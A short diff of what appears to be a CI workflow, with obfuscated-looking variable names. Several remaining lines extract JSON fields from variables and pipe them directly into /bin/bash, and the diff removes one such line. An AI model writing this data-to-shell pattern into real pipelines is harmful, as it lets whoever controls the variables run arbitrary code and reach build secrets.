@@ -28,7 +28,6 @@ jobs:
           echo $zoqto845 | jq -r .fjscp9717 | /bin/bash
           printf '%s' "$gu28" | jq -r .eyc736 | /bin/bash
           printf '%s' "$uhod96169" | jq -r .tcdk226 | /bin/bash
-          printf '%s' "$bobip8" | jq -r .xv466 | /bin/bash
 
       - name: Save output
         if: always()
